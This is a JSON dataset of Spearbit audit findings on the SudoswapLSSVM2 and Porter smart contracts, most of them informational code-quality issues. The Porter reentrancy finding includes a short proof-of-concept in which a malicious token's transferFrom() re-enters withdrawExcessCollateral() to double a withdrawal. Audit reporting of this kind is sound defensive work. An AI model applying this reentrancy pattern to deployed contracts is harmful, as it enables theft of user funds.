        "body": "LSSVMPair contract defines the following functions which are missing from interface ILSSVMPair: 53 ROYALTY_ENGINE() spotPrice() delta() assetRecipient() pairVariant() factory() swapNFTsForToken() (2 versions) swapTokenForSpecificNFTs() getSellNFTQuoteWithRoyalties() call() withdrawERC1155()",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Absent/Incomplete Natspec affects readability and maintenance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Comments are key to understanding the codebase logic. In particular, Natspec comments provide rich documentation for functions, return variables and more. This documentation aids users, developers and auditors in understanding what the functions within the contract are meant to do. However, some functions within the codebase contain issues with respect to their comments with either no Natspec or incomplete Natspec annotations, leading to partial descriptions of the functions.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational IOwnershipTransferReceiver.sol#L6, OwnableWithTransferCallback.sol#L39-L42, RangeProp-"
        ]
    },
    {
        "title": "MAX_SETTABLE_FEE value does not follow a standard notation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The protocol establishes several constant hard-coded MAX_FEE-like variables across different con- tracts. The percentages expressed in those variables should be declared in a standard way all over the codebase. In StandardSettings.sol#L22, the standard followed by the rest of the codebase is not respected. Not respecting the standard notation may confuse the reader.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "No modifier for __Ownable_init",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Usually __Ownable_init also has a modifier like initializer or onlyInitializing, see Own- ableUpgradeable.sol#L29. The version in OwnableWithTransferCallback.sol doesn't have this. It is not really necessary as the function is internal but it is more robust if it has. function __Ownable_init(address initialOwner) internal { _owner = initialOwner; }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Wrong value of seconds in year slightly affects precision",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Calculation of ONE_YEAR_SECS takes into account leap years (typically 365.25 days), looking for most exact precision. However as can be seen at NASA and stackoverflow, the value is slightly different. Current case: 365.2425 days = 31_556_952 / (24 * 3600) NASA case: 365.2422 days = 31_556_926 / (24 * 3600)",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing idempotent checks may be added for consistency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Setter functions could check if the value being set is the same as the variable's existing value to avoid doing a state variable write in such scenarios and they could also revert to flag potentially mismatched offchain-onchain states. While this is done in many places, there are a few setters missing this check.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing events affect transparency and monitoring",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Missing events in critical functions, especially privileged ones, reduce transparency and ease of monitoring. Users may be surprised at changes affected by such functions without being able to observe related events.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational LSSVMPair.sol#L640-L645, LSSVMPairFactory.sol#L485-L492, LSSVMPairFactory.sol#L501-L508,"
        ]
    },
    {
        "title": "Wrong error returned affects debugging and off-chain monitoring",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Error.INVALID_NUMITEMS is declared for 0 case, but is returned twice in the same function: first time for numItems == 0 and second time for numItems >= nftBalance. This can make hard to know why it is failing.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Functions can be renamed for clarity and consistency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Since both functions cloneETHPair() and cloneERC20Pair() use IERC721 nft as a parameter, renaming them to cloneERC721ETHPair() and cloneERC721ERC20Pair() respectively makes it clearer that the functions process ERC721 tokens. This also provides consistency in the naming of functions considering that we already have function cloneERC1155ETHPair() using this nomenclature.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Two events TokenDeposit() with different parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The event TokenDeposit() of LSSVMPairFactory has an address parameter while the event Tok- enDeposit() of LSSVMPair has an uint256 parameter. This might be confusing. contract LSSVMPairFactory { ... event TokenDeposit(address poolAddress); ... } abstract contract LSSVMPair ... { ... event TokenDeposit(uint256 amount); ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused imports affect readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The following imports are unused in  XykCurve.sol import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\"; import {LSSVMPair} from \"../LSSVMPair.sol\"; import {LSSVMPairERC20} from \"../LSSVMPairERC20.sol\"; import {LSSVMPairCloner} from \"../lib/LSSVMPairCloner.sol\"; import {ILSSVMPairFactoryLike} from \"../LSSVMPairFactory.sol\";  LSSVMPairERC20.sol 58 import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\"; import {ICurve} from \"./bonding-curves/ICurve.sol\"; import {CurveErrorCodes} from \"./bonding-curves/CurveErrorCodes.sol\";  LSSVMPairETH.sol import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\"; import {ICurve} from \"./bonding-curves/ICurve.sol\";",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use of isPair() is not intuitive",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "There are two usecases for isPair() 1) To check if the contract is a pair of any of the 4 types. Here the type is always retrieved via pairVariant(). 2) To check if a pair is ETH / ERC20 / ERC721 / ERC1155. Each of these values are represented by two different pair types. Using isPair() this way is not intuitive and some errors have been made in the code where only one value is tested. Note: also see issue \"pairTransferERC20From only supports ERC721 NFTs\". Function isPair() could be refactored to make the code easier to read and maintain. function isPair(address potentialPair, PairVariant variant) public view override returns (bool) { ... } These are the occurrences of use case 1: LSSVMPairFactory.sol: require(isPair(pairAddress, LSSVMPair(pairAddress).pairVariant()), \"Invalid pair address\"); ,! LSSVMPairFactory.sol: address\"); ,! LSSVMPairFactory.sol: require(isPair(pairAddress, LSSVMPair(pairAddress).pairVariant()), \"Invalid pair if (isPair(recipient, LSSVMPair(recipient).pairVariant())) { // router interaction, which first queries `pairVariant()` LSSVMPairERC20.sol: LSSVMPairERC20.sol: LSSVMPairERC20.sol: erc721/LSSVMPairERC721.sol: erc721/LSSVMPairERC721.sol: erc1155/LSSVMPairERC1155.sol: // router and VeryFastRouter function pairTransferERC20From(..., ILSSVMPairFactoryLike.PairVariant variant) ... { router.pairTransferERC20From(..., pairVariant()); router.pairTransferERC20From(..., pairVariant() router.pairTransferERC20From(..., pairVariant()); router.pairTransferNFTFrom(..., pairVariant()); router.pairTransferNFTFrom(..., pairVariant()); router.pairTransferERC1155From(..., pairVariant()); ... require(factory.isPair(msg.sender, variant), \"Not pair\"); ... } function pairTransferNFTFrom(..., ILSSVMPairFactoryLike.PairVariant variant ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... ... } function pairTransferERC1155From(..., ILSSVMPairFactoryLike.PairVariant variant) ... { ... require(factory.isPair(msg.sender, variant), \"Not pair\"); ... } These are the occurrences of use case 2: 59 LSSVMPairFactory.sol: StandardSettings.sol: StandardSettings.sol: StandardSettings.sol: StandardSettings.sol: (isPair(...ERC721_ERC20) ...isPair(....ERC721_ETH) ...isPair(...ERC721_ERC20) ...isPair(...ERC721_ETH) ...isPair(...ERC721_ERC20) || isPair(...ERC1155_ERC20)) || ...isPair(...ERC1155_ETH) || ...isPair(...ERC1155_ERC20) || ...isPair(...ERC1155_ETH) || ...isPair(...ERC1155_ERC20)",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Royalty related code spread across different contracts affects readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The contract LSSVMPairFactory contains the function authAllowedForToken(), which has a lot of interactions with external contracts related to royalties. The code is rather similar to code that is present in the RoyaltyEngine contract. Combining this code in RoyaltyEngine contract would make the code cleaner and easier to read.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Freeze Redeems if bonds too Large",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "Issuing too many bonds can result in users being unable to redeem. This is caused by arithmetic overow in previewRedeemAtMaturity. If a users bonds andpaidAmounts (or bonds * nonPaidAmount) product is greater than 2**256, it will overow, reverting all attempts to redeem bonds.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Reentrancy in withdrawExcessCollateral() and withdrawExcessPayment() functions.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "withdrawExcessCollateral() and withdrawExcessPayment() enable the caller to withdraw excess collateral and payment tokens respectively. Both functions are guarded by an onlyOwner modier, limiting their access to the owner of the contract. function withdrawExcessCollateral(uint256 amount, address receiver) external onlyOwner function withdrawExcessPayment(address receiver) external onlyOwner When transferring tokens, execution ow is handed over to the token contract. Therefore, if a malicious token manages to call the owners address it can also call these functions again to withdraw more tokens than required. As an example consider the following case where the collateral tokens transferFrom() function calls the owners address: 4 function transferFrom( address from, address to, uint256 amount ) public virtual override returns (bool) { if (reenter) { reenter = false; owner.attack(bond, amount); } address spender = _msgSender(); _spendAllowance(from, spender, amount); _transfer(from, to, amount); return true; } and the owner contract has a function: function attack(address _bond, uint256 _amount) external { IBond(_bond).withdrawExcessCollateral(_amount, address(this)); } When withdrawExcessCollateral() is called by owner, it allows it to withdraw double the amount via reentrancy.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "burn() and burnFrom() allow users to lose their bonds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "The Bond contract inherits from ERC20BurnableUpgradeable. contract Bond is IBond, OwnableUpgradeable, ERC20BurnableUpgradeable, This exposes the burn() and burnFrom() functions to users who could get their bonds burned due to an error or a front-end attack.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing two-step transfer ownership pattern",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "After a bond is created its ownership is transferred to the wallet which invoked the createBond function, but it can be later transferred to anyone at any time or the renounceOwnership function can be called. The Bond contract uses the Ownable Openzeppelin contract, which is a simple mechanism to transfer ownership without supporting a two-step ownership transfer pattern. OpenZeppelin describes Ownable as: Ownable is a simpler mechanism with a single owner \"role\" that can be assigned to a single account. This simpler mechanism can be useful for quick tests but projects with production concerns are likely to outgrow it. Ownership transfer is a critical operation and transferring it to an inaccessible wallet or renouncing ownership by mistake can effectively lock the collateral in the contract forever.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inefcient initialization of minimal proxy implementation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "The Bond contract uses a minimal proxy pattern when deployed by BondFactory. The proxy pattern requires a special initialize method to be called to set the state of each cloned contract. Nevertheless, the implementation contract can be left uninitialized, giving an attacker the opportunity to invoke the initialization. constructor() { tokenImplementation = address(new Bond()); _grantRole(DEFAULT_ADMIN_ROLE, _msgSender()); } After the reporting the issue it was discovered that a separate (not merged) development branch implements a deployment script which initializes the Bond implementation contract after the main deployment of BondFactory, leaving a narrow window for the attacker to leverage this issue and reducing impact signicantly. deploy_bond_factory.ts#L24 6 const implementationContract = (await ethers.getContractAt( \"Bond\", await factory.tokenImplementation() )) as Bond; try { await waitUntilMined( await implementationContract.initialize( \"Placeholder Bond\", \"BOND\", deployer, THREE_YEARS_FROM_NOW_IN_SECONDS, \"0x0000000000000000000000000000000000000000\", \"0x0000000000000000000000000000000000000001\", ethers.BigNumber.from(0), ethers.BigNumber.from(0), 0 ) ); } catch (e) { console.log(\"Is the contract already initialized?\"); console.log(e); } Due to the fact that the initially reviewed code did not have the proper initialization for the Bond implementation (as it was an unmerged branch) and because in case of a successful exploitation the impact on the system remains minimal, this nding is marked as low risk. It is not necessary to create a separate transaction and initialize the storage of the implementation contract to prevent unauthorized initialization.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Verify amount is greater than 0 to avoid unnecessarily safeTransfer() calls",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "Balance should be checked to avoid unnecessary safeTransfer() calls with an amount of 0.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Improve checks for token allow-list",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "The BondFactory contract has two enabled allow-lists by default, which require the teams approval for issuers and tokens to create bonds. However, the screening process was not properly dened before the assessment. In case a malicious token and issuer slip through the screening process the protocol can be used by malicious actors to perform mass scam attacks. In such scenario, tokens and issuers would be able to create bonds, sell those anywhere and later on exploit those tokens, leading to loss of user funds. /// @inheritdoc IBondFactory function createBond( string memory name, string memory symbol, uint256 maturity, address paymentToken, address collateralToken, uint256 collateralTokenAmount, uint256 convertibleTokenAmount, uint256 bonds ) external onlyIssuer returns (address clone)",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect revert message",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "error BondBeforeGracePeriodOrPaid() is used to revert when !isAfterGracePeriod() && amountPaid() > 0, which means the bonds is before the grace period and not paid for. Therefore, the error description is incorrect. if (isAfterGracePeriod() || amountUnpaid() == 0) { _; } else { revert BondBeforeGracePeriodOrPaid(); }",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Informational"
        ]
    },
    {
        "title": "Non-existent bonds naming/symbol restrictions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "The issuer can dene any name and symbol during bond creation. Naming is neither enforced nor constructed by the contract and may result in abusive or misleading names which could have a negative impact on the PR of the project. /// @inheritdoc IBondFactory function createBond( string memory name, string memory symbol, uint256 maturity, address paymentToken, address collateralToken, uint256 collateralTokenAmount, uint256 convertibleTokenAmount, uint256 bonds ) external onlyIssuer returns (address clone) A malicious user could hypothetically use arbitrary names to:  Mislead users into thinking they are buying bonds consisting of different tokens.  Use abusive names to discredit the team.  Attempt to exploit the frontend application by injecting arbitrary HTML data. The team had a discussion regarding naming conventions in the past. However, not all the abovementioned scenarios were brought up during that conversation. Therefore, this nding is reported as informational to revisit and estimate its potential impact, or add it as a test case during the web application implementation.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Informational"
        ]
    },
    {
        "title": "Needles variable initialization for default values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "uint256 variable are initialized to a default value of zero per Solidity docs. Setting a variable to the default value is unnecessary.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Informational"
        ]
    },
    {
        "title": "Deationary payment tokens are not handled in the pay() function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Porter-Spearbit-Security-Review.pdf",
        "body": "The pay() function does not support rebasing/deflationary/inflationary payment tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.",
        "labels": [
            "Spearbit",
            "Porter",
            "Severity: Informational"
        ]
    }
]